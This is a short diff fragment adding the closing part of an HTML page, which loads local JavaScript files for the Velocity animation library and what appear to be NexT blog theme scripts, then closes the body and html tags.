+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
